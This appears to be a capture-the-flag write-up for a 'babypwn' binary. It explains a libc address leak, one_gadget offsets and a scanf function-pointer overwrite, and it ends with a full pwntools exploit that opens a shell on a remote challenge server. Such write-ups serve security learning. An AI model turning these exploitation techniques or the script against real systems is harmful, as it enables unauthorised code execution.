The pseudocode of the program looks like this

```cpp
void main(void)
{
  code *fptr;
  
  leak_memory(1,&stdout,4,0xcafebabe,0xdeadbeef,1,3,3,7);
  scanf("%d",&fptr);
  (*fptr)(0xdeadbeef);
  return;
}

void leak_memory(int a, char* b, int c, int d, int e, int f, int g, int h, int i) {
    write(a, b, c);
}
```

So thanks to `leak_memory`, we have the address of `_IO_2_1_stdout`. This can be confirmed by reading the 4 bytes printed to the output, then converting it to integer and checking it in gdb.

```py
from pwn import *

r = process("./babypwn")
leak = u32(r.recv(4))
libc_base = leak
log.info(hex(leak))
pause()
```

Knowing the address of `_IO_2_1_stdout` means we can subtract the offset (0xd80 + 0x1d8000) to know the address of libc. 0xd80 is obtained from the output of `xinfo`. 0x1d8000 is obtained from `0xf76e2000-0xf750a000` because 0xd80 is the offset from 0xf76e2000 while 0xf750a000 is the actual start of libc.

```py
libc_base = leak - 0xd80 - 0x1d8000
log.info("Leaked: " + hex(libc_base))
```

Next the `scanf` allows us to write into the variable `fptr`. This is the address of the function that will be called next. Because ultimately we want a shell to gain access to the server, the `one_gadget` tool is very helpful to find addresses in a binary that when executed will give a shell.

It is always possible to find such address in libc because it is so big, so just need to run `one_gadget` on it to get the list of possible offsets.

```plaintext
➤ cp /lib/i386-linux-gnu/libc-2.27.so .
➤ one_gadget libc-2.27.so
0x3d0d3	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3d0d5	execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3d0d9	execve("/bin/sh", esp+0x3c, environ)

  [esp+0x3c] == NULL

0x3d0e0	execve("/bin/sh", esp+0x40, environ)

  esi is the GOT address of libc
  [esp+0x40] == NULL

0x67a7f	execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x67a80	execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

0x137e5e	execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x137e5f	execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
```

Trying a few of them, I get (libc_base+0x3d0d5) that works. Oh also, to properly write the address using scanf, we need to pass in addresses higher than 0x7fffffff as a negative number otherwise it will just be capped at 0x7fffffff.

This offset may work on my machine but may not on the server because the libc versions may be different. If it doesn't then I will need to download other libc versions and try different offsets. But nevermind, it worked on first try.

```py
from pwn import *

# r = process("./babypwn")
r = remote("45.76.161.20", 19509)

# get leaked _IO_2_1_stdout and libc base
leak = u32(r.recv(4))
libc_base = leak - 0xd80 - 0x1d8000
log.info("Leaked: " + hex(libc_base))

# input address to get shell
sh = libc_base + 0x3d0d5
log.info("Shell: " + hex(sh))
sh = -(2**32 - sh) if sh > 0x7fffffff else sh
r.sendline(str(sh))

r.interactive()
```
